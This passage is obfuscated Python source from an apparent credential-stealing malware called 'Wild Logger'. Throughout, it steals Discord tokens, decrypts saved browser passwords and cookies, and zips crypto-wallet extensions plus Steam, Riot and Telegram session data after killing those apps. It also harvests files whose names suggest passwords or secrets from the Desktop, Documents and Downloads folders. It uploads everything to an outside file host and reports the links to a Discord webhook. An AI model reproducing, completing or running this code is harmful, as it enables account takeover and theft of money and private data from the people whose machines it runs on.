        L04durl1b (webh00k ,data =dumps (O0OO000O000OO0OO0 ).encode (),headers =O0O0OO00O00OO00OO )#line:499
        return #line:500
    if OOOOO0O00O0OOO000 =="kiwi":#line:502
        O0OO000O000OO0OO0 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"files found on users pc","value":OO000O000OO0O0000 }],"author":{"name":"Wild File Stealer"},"footer":{"text":"Wild Logger","icon_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"}}],"username":"Wild Logger","avatar_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg","attachments":[]}#line:526
        L04durl1b (webh00k ,data =dumps (O0OO000O000OO0OO0 ).encode (),headers =O0O0OO00O00OO00OO )#line:527
        return #line:528
def wr1tef0rf1l3 (O0000O0OO0O0OO0OO ,O00OO0OOOO0000OO0 ):#line:537
    O00O0OO0000O0O00O =os .getenv ("TEMP")+f"\cr{O00OO0OOOO0000OO0}.txt"#line:538
    with open (O00O0OO0000O0O00O ,mode ='w',encoding ='utf-8')as O00O0O0O0OO00OOOO :#line:539
        O00O0O0O0OO00OOOO .write (f"- Yum, yum. https://github.com/brickinghouses/Wild-Logger - \n\n")#line:540
        for OO0O00O000O0000OO in O0000O0OO0O0OO0OO :#line:541
            if OO0O00O000O0000OO [0 ]!='':#line:542
                O00O0O0O0OO00OOOO .write (f"{OO0O00O000O0000OO}\n")#line:543
AuthT0kenDisc0rds =''#line:545
def getAuthT0kenDisc0rd (OO00OO00OOOO00OOO ,O0O000OOOO0O00OO0 ):#line:546
    if not os .path .exists (OO00OO00OOOO00OOO ):return #line:547
    OO00OO00OOOO00OOO +=O0O000OOOO0O00OO0 #line:549
    for OO000O0O00OO000OO in os .listdir (OO00OO00OOOO00OOO ):#line:550
        if OO000O0O00OO000OO .endswith (".log")or OO000O0O00OO000OO .endswith (".ldb"):#line:551
            for O0OOO000O0O0O0000 in [OO0OOO0O00OOO00O0 .strip ()for OO0OOO0O00OOO00O0 in open (f"{OO00OO00OOOO00OOO}\\{OO000O0O00OO000OO}",errors ="ignore").readlines ()if OO0OOO0O00OOO00O0 .strip ()]:#line:552
                for O00000OO0OOO00OO0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:553
                    for OO0OOOOO0O0OO0000 in re .findall (O00000OO0OOO00OO0 ,O0OOO000O0O0O0000 ):#line:554
                        global AuthT0kenDisc0rds #line:555
                        if ch1ckT4k1n (OO0OOOOO0O0OO0000 ):#line:556
                            if not OO0OOOOO0O0OO0000 in AuthT0kenDisc0rds :#line:557
                                AuthT0kenDisc0rds +=OO0OOOOO0O0OO0000 #line:559
                                upl05dT4k31 (OO0OOOOO0O0OO0000 ,OO00OO00OOOO00OOO )#line:560
P4ssw =[]#line:562
def getP4ssw (O00O000OO0O0OOO00 ,O00OOO0O0OO0OO00O ):#line:563
    global P4ssw ,P4sswCount #line:564
    if not os .path .exists (O00O000OO0O0OOO00 ):return #line:565
    OOOO0000OO00O0O00 =O00O000OO0O0OOO00 +O00OOO0O0OO0OO00O +"/Login Data"#line:567
    if os .stat (OOOO0000OO00O0O00 ).st_size ==0 :return #line:568
    O0O00O00O00OO000O =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O00O000OO00OO0OOO in range (8 ))+".db"#line:570
    shutil .copy2 (OOOO0000OO00O0O00 ,O0O00O00O00OO000O )#line:572
    OO0000000000OOO0O =sql_connect (O0O00O00O00OO000O )#line:573
    OOO00OOO0O0O00O00 =OO0000000000OOO0O .cursor ()#line:574
    OOO00OOO0O0O00O00 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:575
    OO0O00OOO0O00O0O0 =OOO00OOO0O0O00O00 .fetchall ()#line:576
    OOO00OOO0O0O00O00 .close ()#line:577
    OO0000000000OOO0O .close ()#line:578
    os .remove (O0O00O00O00OO000O )#line:579
    OO00O00OO0OOOOO00 =O00O000OO0O0OOO00 +"/Local State"#line:581
    with open (OO00O00OO0OOOOO00 ,'r',encoding ='utf-8')as O0O0OOOOO0O000O0O :O000O0O000O00O000 =json_loads (O0O0OOOOO0O000O0O .read ())#line:582
    OO0OO0O0OO0OOO00O =b64decode (O000O0O000O00O000 ['os_crypt']['encrypted_key'])#line:583
    OO0OO0O0OO0OOO00O =CryptUnprotectData (OO0OO0O0OO0OOO00O [5 :])#line:584
    for OO0000O00O00OOOO0 in OO0O00OOO0O00O0O0 :#line:586
        if OO0000O00O00OOOO0 [0 ]!='':#line:587
            for O0000000O0OO0O0O0 in keyword :#line:588
                O0000O000O000O00O =O0000000O0OO0O0O0 #line:589
                if "https"in O0000000O0OO0O0O0 :#line:590
                    OO0O0OO0O00O0O0O0 =O0000000O0OO0O0O0 #line:591
                    O0000000O0OO0O0O0 =OO0O0OO0O00O0O0O0 .split ('[')[1 ].split (']')[0 ]#line:592
                if O0000000O0OO0O0O0 in OO0000O00O00OOOO0 [0 ]:#line:593
                    if not O0000O000O000O00O in paswWords :paswWords .append (O0000O000O000O00O )#line:594
            P4ssw .append (f"UR1: {OO0000O00O00OOOO0[0]} | U53RN4M3: {OO0000O00O00OOOO0[1]} | P455W0RD: {D3kryptV4lU3(OO0000O00O00OOOO0[2], OO0OO0O0OO0OOO00O)}")#line:595
            P4sswCount +=1 #line:596
    wr1tef0rf1l3 (P4ssw ,'passw')#line:597
C00k13 =[]#line:599
def getC00k13 (OOO00OO0OO0OO0000 ,O0O0OOO000OOO0OOO ):#line:600
    global C00k13 ,CookiCount #line:601
    if not os .path .exists (OOO00OO0OO0OO0000 ):return #line:602
    OO00OO000OO0OOO00 =OOO00OO0OO0OO0000 +O0O0OOO000OOO0OOO +"/Cookies"#line:604
    if os .stat (OO00OO000OO0OOO00 ).st_size ==0 :return #line:605
    OOOOOO00O00O0OOO0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOO0OOOOOOO000OO0 in range (8 ))+".db"#line:607
    shutil .copy2 (OO00OO000OO0OOO00 ,OOOOOO00O00O0OOO0 )#line:609
    OO0O000O00O00OO0O =sql_connect (OOOOOO00O00O0OOO0 )#line:610
    O000O00OO0O00OOOO =OO0O000O00O00OO0O .cursor ()#line:611
    O000O00OO0O00OOOO .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:612
    OOOO000000O000OOO =O000O00OO0O00OOOO .fetchall ()#line:613
    O000O00OO0O00OOOO .close ()#line:614
    OO0O000O00O00OO0O .close ()#line:615
    os .remove (OOOOOO00O00O0OOO0 )#line:616
    O000000O0O00O0O00 =OOO00OO0OO0OO0000 +"/Local State"#line:618
    with open (O000000O0O00O0O00 ,'r',encoding ='utf-8')as O000OOOOO0O0000O0 :OOO00000OOOO0OO00 =json_loads (O000OOOOO0O0000O0 .read ())#line:620
    O0OO0O0O00OOOO0O0 =b64decode (OOO00000OOOO0OO00 ['os_crypt']['encrypted_key'])#line:621
    O0OO0O0O00OOOO0O0 =CryptUnprotectData (O0OO0O0O00OOOO0O0 [5 :])#line:622
    for OOOOO0O0O0O0O00OO in OOOO000000O000OOO :#line:624
        if OOOOO0O0O0O0O00OO [0 ]!='':#line:625
            for OOO0O00OOOOO000O0 in keyword :#line:626
                O0OOOO000000OOOO0 =OOO0O00OOOOO000O0 #line:627
                if "https"in OOO0O00OOOOO000O0 :#line:628
                    O000OO0OOO0OOOOOO =OOO0O00OOOOO000O0 #line:629
                    OOO0O00OOOOO000O0 =O000OO0OOO0OOOOOO .split ('[')[1 ].split (']')[0 ]#line:630
                if OOO0O00OOOOO000O0 in OOOOO0O0O0O0O00OO [0 ]:#line:631
                    if not O0OOOO000000OOOO0 in cookiWords :cookiWords .append (O0OOOO000000OOOO0 )#line:632
            C00k13 .append (f"{OOOOO0O0O0O0O00OO[0]}	TRUE	/	FALSE	2597573456	{OOOOO0O0O0O0O00OO[1]}	{D3kryptV4lU3(OOOOO0O0O0O0O00OO[2], O0OO0O0O00OOOO0O0)}")#line:633
            CookiCount +=1 #line:634
    wr1tef0rf1l3 (C00k13 ,'cook')#line:635
def G3tD1sc0rd (O00O0OOOOOO00OOOO ,O00OO00O0O00O0O00 ):#line:637
    if not os .path .exists (f"{O00O0OOOOOO00OOOO}/Local State"):return #line:638
    O00O0OOOO0OO00000 =O00O0OOOOOO00OOOO +O00OO00O0O00O0O00 #line:640
    OOO0OO0OO0O0O0OOO =O00O0OOOOOO00OOOO +"/Local State"#line:642
    with open (OOO0OO0OO0O0O0OOO ,'r',encoding ='utf-8')as OO0O0O0OOOO00O000 :OO0OO0O00OOO00OO0 =json_loads (OO0O0O0OOOO00O000 .read ())#line:643
    OOO0O0OOOOO0O0OOO =b64decode (OO0OO0O00OOO00OO0 ['os_crypt']['encrypted_key'])#line:644
    OOO0O0OOOOO0O0OOO =CryptUnprotectData (OOO0O0OOOOO0O0OOO [5 :])#line:645
    for OO0OOOO000OO0O0O0 in os .listdir (O00O0OOOO0OO00000 ):#line:648
        if OO0OOOO000OO0O0O0 .endswith (".log")or OO0OOOO000OO0O0O0 .endswith (".ldb"):#line:650
            for O000OO0OOO00O0O0O in [O0O0OO000O00O0OO0 .strip ()for O0O0OO000O00O0OO0 in open (f"{O00O0OOOO0OO00000}\\{OO0OOOO000OO0O0O0}",errors ="ignore").readlines ()if O0O0OO000O00O0OO0 .strip ()]:#line:651
                for OOO0OOOOO0OO00OO0 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O000OO0OOO00O0O0O ):#line:652
                    global AuthT0kenDisc0rds #line:653
                    O0O0OO00O0O00OOOO =D3kryptV4lU3 (b64decode (OOO0OOOOO0OO00OO0 .split ('dQw4w9WgXcQ:')[1 ]),OOO0O0OOOOO0O0OOO )#line:654
                    if ch1ckT4k1n (O0O0OO00O0O00OOOO ):#line:655
                        if not O0O0OO00O0O00OOOO in AuthT0kenDisc0rds :#line:656
                            AuthT0kenDisc0rds +=O0O0OO00O0O00OOOO #line:658
                            upl05dT4k31 (O0O0OO00O0O00OOOO ,O00O0OOOOOO00OOOO )#line:660
def GatherZips (O0OOOOO00O000O0O0 ,O000O0OO00O000000 ,OOO00O0O0OOOOOO00 ):#line:662
    O00O0O0OO0O000O00 =[]#line:663
    for OOO0000OOO0O0OO00 in O0OOOOO00O000O0O0 :#line:664
        O0O000OOO0000OOOO =threading .Thread (target =Z1pTh1ngs ,args =[OOO0000OOO0O0OO00 [0 ],OOO0000OOO0O0OO00 [5 ],OOO0000OOO0O0OO00 [1 ]])#line:665
        O0O000OOO0000OOOO .start ()#line:666
        O00O0O0OO0O000O00 .append (O0O000OOO0000OOOO )#line:667
    for OOO0000OOO0O0OO00 in O000O0OO00O000000 :#line:669
        O0O000OOO0000OOOO =threading .Thread (target =Z1pTh1ngs ,args =[OOO0000OOO0O0OO00 [0 ],OOO0000OOO0O0OO00 [2 ],OOO0000OOO0O0OO00 [1 ]])#line:670
        O0O000OOO0000OOOO .start ()#line:671
        O00O0O0OO0O000O00 .append (O0O000OOO0000OOOO )#line:672
    O0O000OOO0000OOOO =threading .Thread (target =ZipTelegram ,args =[OOO00O0O0OOOOOO00 [0 ],OOO00O0O0OOOOOO00 [2 ],OOO00O0O0OOOOOO00 [1 ]])#line:674
    O0O000OOO0000OOOO .start ()#line:675
    O00O0O0OO0O000O00 .append (O0O000OOO0000OOOO )#line:676
    for O0OOO0000O0000000 in O00O0O0OO0O000O00 :#line:678
        O0OOO0000O0000000 .join ()#line:679
    global WalletsZip ,GamingZip ,OtherZip #line:680
    OOO0O0O00O000O00O ,O0OO0000O0OOOO00O ,O0OO00O00O0O0O000 ="",'',''#line:683
    if not len (WalletsZip )==0 :#line:684
        OOO0O0O00O000O00O =":coin:  •  Wallets\n"#line:685
        for OO0OOO00OO0O0OOOO in WalletsZip :#line:686
            OOO0O0O00O000O00O +=f"└─ [{OO0OOO00OO0O0OOOO[0]}]({OO0OOO00OO0O0OOOO[1]})\n"#line:687
    if not len (WalletsZip )==0 :#line:688
        O0OO0000O0OOOO00O =":video_game:  •  Gaming:\n"#line:689
        for OO0OOO00OO0O0OOOO in GamingZip :#line:690
            O0OO0000O0OOOO00O +=f"└─ [{OO0OOO00OO0O0OOOO[0]}]({OO0OOO00OO0O0OOOO[1]})\n"#line:691
    if not len (OtherZip )==0 :#line:692
        O0OO00O00O0O0O000 =":tickets:  •  Apps\n"#line:693
        for OO0OOO00OO0O0OOOO in OtherZip :#line:694
            O0OO00O00O0O0O000 +=f"└─ [{OO0OOO00OO0O0OOOO[0]}]({OO0OOO00OO0O0OOOO[1]})\n"#line:695
    OOO0OO000OO0OOOOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:699
    O000O0OOO00OO0000 ={"content":globalInfo (),"embeds":[{"title":"Wild Zips","description":f"{OOO0O0O00O000O00O}\n{O0OO0000O0OOOO00O}\n{O0OO00O00O0O0O000}","color":2895667 ,"footer":{"text":"Wild Logger","icon_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg"}}],"username":"Wild Logger","avatar_url":"https://github.com/brickinghouses/Wild-Logger/blob/main/proxy-image.jpg","attachments":[]}#line:717
    L04durl1b (webh00k ,data =dumps (O000O0OOO00OO0000 ).encode (),headers =OOO0OO000OO0OOOOO )#line:718
def ZipTelegram (O0OOOO000OOO0O0OO ,O00OOOO00O0OO00O0 ,O00OO000000O0OO0O ):#line:721
    global OtherZip #line:722
    OO0O000O0O0O0OO0O =O0OOOO000OOO0O0OO #line:723
    OOO000OO0O0O0OOO0 =O00OOOO00O0OO00O0 #line:724
    if not os .path .exists (OO0O000O0O0O0OO0O ):return #line:725
    subprocess .Popen (f"taskkill /im {O00OO000000O0OO0O} /t /f >nul 2>&1",shell =True )#line:726
    O0O0OO00OOOOOO00O =ZipFile (f"{OO0O000O0O0O0OO0O}/{OOO000OO0O0O0OOO0}.zip","w")#line:728
    for OO0O0OO0OO0OOO000 in os .listdir (OO0O000O0O0O0OO0O ):#line:729
        if not ".zip"in OO0O0OO0OO0OOO000 and not "tdummy"in OO0O0OO0OO0OOO000 and not "user_data"in OO0O0OO0OO0OOO000 and not "webview"in OO0O0OO0OO0OOO000 :#line:730
            O0O0OO00OOOOOO00O .write (OO0O000O0O0O0OO0O +"/"+OO0O0OO0OO0OOO000 )#line:731
    O0O0OO00OOOOOO00O .close ()#line:732
    OOO0O0OOO0O00O00O =uploadToAnonfiles (f'{OO0O000O0O0O0OO0O}/{OOO000OO0O0O0OOO0}.zip')#line:734
    os .remove (f"{OO0O000O0O0O0OO0O}/{OOO000OO0O0O0OOO0}.zip")#line:736
    OtherZip .append ([O00OOOO00O0OO00O0 ,OOO0O0OOO0O00O00O ])#line:737
def Z1pTh1ngs (OO0000O00000OOOO0 ,O0O000OO0OOO0000O ,OO00O0OOO0OO00OOO ):#line:739
    O0OOO000OO0OOOOOO =OO0000O00000OOOO0 #line:740
    O0O0O00OO00OOOO0O =O0O000OO0OOO0000O #line:741
    global WalletsZip ,GamingZip ,OtherZip #line:742
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O0O000OO0OOO0000O :#line:745
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:746
        O0O0O00OO00OOOO0O =f"Metamask_{OOO000O00O00OO00O}"#line:747
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:748
    if "ejbalbakoplchlghecdalmeeeajnimhm"in O0O000OO0OOO0000O :#line:750
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:751
        O0O0O00OO00OOOO0O =f"Metamask_Edge"#line:752
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:753
    if "aholpfdialjgjfhomihkjbmgjidlcdno"in O0O000OO0OOO0000O :#line:755
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:756
        O0O0O00OO00OOOO0O =f"Exodus_{OOO000O00O00OO00O}"#line:757
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:758
    if "fhbohimaelbohpjbbldcngcnapndodjp"in O0O000OO0OOO0000O :#line:760
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:761
        O0O0O00OO00OOOO0O =f"Binance_{OOO000O00O00OO00O}"#line:762
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:763
    if "hnfanknocfeofbddgcijnmhnfnkdnaad"in O0O000OO0OOO0000O :#line:765
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:766
        O0O0O00OO00OOOO0O =f"Coinbase_{OOO000O00O00OO00O}"#line:767
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:768
    if "egjidjbpglichdcondbcbdnbeeppgdph"in O0O000OO0OOO0000O :#line:770
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:771
        O0O0O00OO00OOOO0O =f"Trust_{OOO000O00O00OO00O}"#line:772
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:773
    if "bfnaelmomeimhlpmgjnjophhpkkoljpa"in O0O000OO0OOO0000O :#line:775
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:776
        O0O0O00OO00OOOO0O =f"Phantom_{OOO000O00O00OO00O}"#line:777
        O0OOO000OO0OOOOOO =OO0000O00000OOOO0 +O0O000OO0OOO0000O #line:778
    if not os .path .exists (O0OOO000OO0OOOOOO ):return #line:781
    subprocess .Popen (f"taskkill /im {OO00O0OOO0OO00OOO} /t /f >nul 2>&1",shell =True )#line:782
    if "Wallet"in O0O000OO0OOO0000O or "NationsGlory"in O0O000OO0OOO0000O :#line:784
        OOO000O00O00OO00O =OO0000O00000OOOO0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:785
        O0O0O00OO00OOOO0O =f"{OOO000O00O00OO00O}"#line:786
    elif "Steam"in O0O000OO0OOO0000O :#line:788
        if not os .path .isfile (f"{O0OOO000OO0OOOOOO}/loginusers.vdf"):return #line:789
        OOOOOO00000OO0OO0 =open (f"{O0OOO000OO0OOOOOO}/loginusers.vdf","r+",encoding ="utf8")#line:790
        O0OO0O000000O00OO =OOOOOO00000OO0OO0 .readlines ()#line:791
        OO0OO0OOO0OO0O0OO =False #line:793
        for O000OOOO00OOOO00O in O0OO0O000000O00OO :#line:794
            if 'RememberPassword"\t\t"1"'in O000OOOO00OOOO00O :#line:795
                OO0OO0OOO0OO0O0OO =True #line:796
        if OO0OO0OOO0OO0O0OO ==False :return #line:797
        O0O0O00OO00OOOO0O =O0O000OO0OOO0000O #line:798
    O0O0O0OOO0OOO00OO =ZipFile (f"{O0OOO000OO0OOOOOO}/{O0O0O00OO00OOOO0O}.zip","w")#line:801
    for O0O0OOOO00O0O0O0O in os .listdir (O0OOO000OO0OOOOOO ):#line:802
        if not ".zip"in O0O0OOOO00O0O0O0O :O0O0O0OOO0OOO00OO .write (O0OOO000OO0OOOOOO +"/"+O0O0OOOO00O0O0O0O )#line:803
    O0O0O0OOO0OOO00OO .close ()#line:804
    O0OOO000OOO0O0O0O =uploadToAnonfiles (f'{O0OOO000OO0OOOOOO}/{O0O0O00OO00OOOO0O}.zip')#line:806
    os .remove (f"{O0OOO000OO0OOOOOO}/{O0O0O00OO00OOOO0O}.zip")#line:808
    if "Wallet"in O0O000OO0OOO0000O or "eogaeaoehlef"in O0O000OO0OOO0000O or "koplchlghecd"in O0O000OO0OOO0000O or "aelbohpjbbld"in O0O000OO0OOO0000O or "nocfeofbddgc"in O0O000OO0OOO0000O or "bpglichdcond"in O0O000OO0OOO0000O or "momeimhlpmgj"in O0O000OO0OOO0000O or "dialjgjfhomi"in O0O000OO0OOO0000O :#line:810
        WalletsZip .append ([O0O0O00OO00OOOO0O ,O0OOO000OOO0O0O0O ])#line:811
    elif "NationsGlory"in O0O0O00OO00OOOO0O or "Steam"in O0O0O00OO00OOOO0O or "RiotCli"in O0O0O00OO00OOOO0O :#line:812
        GamingZip .append ([O0O0O00OO00OOOO0O ,O0OOO000OOO0O0O0O ])#line:813
    else :#line:814
        OtherZip .append ([O0O0O00OO00OOOO0O ,O0OOO000OOO0O0O0O ])#line:815
def GatherAll ():#line:818
    ""#line:819
    O0O000O00OO0OOO00 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:829
    O0OOO00O000O0OO00 =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:836
    O0OO00OOOOOO0O00O =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:844
    OOO0O0O0OOOOOO000 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:845
    for OOO0OO00O00OO0000 in O0O000O00OO0OOO00 :#line:847
        O0O0O00OOOOOOOO0O =threading .Thread (target =getAuthT0kenDisc0rd ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [2 ]])#line:848
        O0O0O00OOOOOOOO0O .start ()#line:849
        Threadlist .append (O0O0O00OOOOOOOO0O )#line:850
    for OOO0OO00O00OO0000 in O0OOO00O000O0OO00 :#line:851
        O0O0O00OOOOOOOO0O =threading .Thread (target =G3tD1sc0rd ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [1 ]])#line:852
        O0O0O00OOOOOOOO0O .start ()#line:853
        Threadlist .append (O0O0O00OOOOOOOO0O )#line:854
    for OOO0OO00O00OO0000 in O0O000O00OO0OOO00 :#line:856
        O0O0O00OOOOOOOO0O =threading .Thread (target =getP4ssw ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [3 ]])#line:857
        O0O0O00OOOOOOOO0O .start ()#line:858
        Threadlist .append (O0O0O00OOOOOOOO0O )#line:859
    O000O000OO0O00000 =[]#line:861
    for OOO0OO00O00OO0000 in O0O000O00OO0OOO00 :#line:862
        O0O0O00OOOOOOOO0O =threading .Thread (target =getC00k13 ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [4 ]])#line:863
        O0O0O00OOOOOOOO0O .start ()#line:864
        O000O000OO0O00000 .append (O0O0O00OOOOOOOO0O )#line:865
    threading .Thread (target =GatherZips ,args =[O0O000O00OO0OOO00 ,O0OO00OOOOOO0O00O ,OOO0O0O0OOOOOO000 ]).start ()#line:867
    for O00O0O0OO000O0O0O in O000O000OO0O00000 :O00O0O0OO000O0O0O .join ()#line:870
    O00O000OO0000O00O =TR6st (C00k13 )#line:871
    if O00O000OO0000O00O ==True :return #line:872
    for OOO0OO00O00OO0000 in O0O000O00OO0OOO00 :#line:874
         threading .Thread (target =Z1pTh1ngs ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [5 ],OOO0OO00O00OO0000 [1 ]]).start ()#line:875
    for OOO0OO00O00OO0000 in O0OO00OOOOOO0O00O :#line:877
         threading .Thread (target =Z1pTh1ngs ,args =[OOO0OO00O00OO0000 [0 ],OOO0OO00O00OO0000 [2 ],OOO0OO00O00OO0000 [1 ]]).start ()#line:878
    threading .Thread (target =ZipTelegram ,args =[OOO0O0O0OOOOOO000 [0 ],OOO0O0O0OOOOOO000 [2 ],OOO0O0O0OOOOOO000 [1 ]]).start ()#line:880
    for O00O0O0OO000O0O0O in Threadlist :#line:882
        O00O0O0OO000O0O0O .join ()#line:883
    global upths #line:884
    upths =[]#line:885
    for O000000000OOO0000 in ["crpassw.txt","crcook.txt"]:#line:887
        upload (O000000000OOO0000 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+O000000000OOO0000 ))#line:889
def uploadToAnonfiles (OOOO0O0O00O00000O ):#line:891
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (OOOO0O0O00O00000O ,'rb')}).json ()["data"]["downloadPage"]#line:892
    except :return False #line:893
def KiwiFolder (OO0O0O0000O00000O ,OO0O00O0O000O0OO0 ):#line:897
    global KiwiFiles #line:898
    O00000000OO000O00 =7 #line:899
    OOOOO0O000O0OO000 =0 #line:900
    OOO0O0OOOOO00O0O0 =os .listdir (OO0O0O0000O00000O )#line:901
    OO000OOOOO0000O0O =[]#line:902
    for O00O00OOO00O00OOO in OOO0O0OOOOO00O0O0 :#line:903
        if not os .path .isfile (OO0O0O0000O00000O +"/"+O00O00OOO00O00OOO ):return #line:904
        OOOOO0O000O0OO000 +=1 #line:905
        if OOOOO0O000O0OO000 <=O00000000OO000O00 :#line:906
            O000OOOOOOOOO000O =uploadToAnonfiles (OO0O0O0000O00000O +"/"+O00O00OOO00O00OOO )#line:907
            OO000OOOOO0000O0O .append ([OO0O0O0000O00000O +"/"+O00O00OOO00O00OOO ,O000OOOOOOOOO000O ])#line:908
        else :#line:909
            break #line:910
    KiwiFiles .append (["folder",OO0O0O0000O00000O +"/",OO000OOOOO0000O0O ])#line:911
KiwiFiles =[]#line:913
def KiwiFile (OOOO00O0O0OOO0OO0 ,OO0O00O00OO00OO0O ):#line:914
    global KiwiFiles #line:915
    O000OOOO00OOOOO00 =[]#line:916
    O000OOOO00O00OO0O =os .listdir (OOOO00O0O0OOO0OO0 )#line:917
    for O0O00O0OO0OO0O0OO in O000OOOO00O00OO0O :#line:918
        for O000O00O000O00000 in OO0O00O00OO00OO0O :#line:919
            if O000O00O000O00000 in O0O00O0OO0OO0O0OO .lower ():#line:920
                if os .path .isfile (OOOO00O0O0OOO0OO0 +"/"+O0O00O0OO0OO0O0OO )and ".txt"in O0O00O0OO0OO0O0OO :#line:921
                    O000OOOO00OOOOO00 .append ([OOOO00O0O0OOO0OO0 +"/"+O0O00O0OO0OO0O0OO ,uploadToAnonfiles (OOOO00O0O0OOO0OO0 +"/"+O0O00O0OO0OO0O0OO )])#line:922
                    break #line:923
                if os .path .isdir (OOOO00O0O0OOO0OO0 +"/"+O0O00O0OO0OO0O0OO ):#line:924
                    O0OOOOO0OOOO000O0 =OOOO00O0O0OOO0OO0 +"/"+O0O00O0OO0OO0O0OO #line:925
                    KiwiFolder (O0OOOOO0OOOO000O0 ,OO0O00O00OO00OO0O )#line:926
                    break #line:927
    KiwiFiles .append (["folder",OOOO00O0O0OOO0OO0 ,O000OOOO00OOOOO00 ])#line:929
def Kiwi ():#line:931
    OOOO000O0OOOOO0O0 =temp .split ("\AppData")[0 ]#line:932
    O0O0OOOO0O0O00000 =[OOOO000O0OOOOO0O0 +"/Desktop",OOOO000O0OOOOO0O0 +"/Downloads",OOOO000O0OOOOO0O0 +"/Documents"]#line:937
    O0O000O0OO000OO0O =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:965
    O00OOO0OOOO0O0OO0 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:993
    OOOOOO00OOOO0OO00 =[]#line:995
    for OOO0OOOO000OO0OO0 in O0O0OOOO0O0O00000 :#line:996
        OOOOO0O0O0O00OOO0 =threading .Thread (target =KiwiFile ,args =[OOO0OOOO000OO0OO0 ,O00OOO0OOOO0O0OO0 ]);OOOOO0O0O0O00OOO0 .start ()#line:997
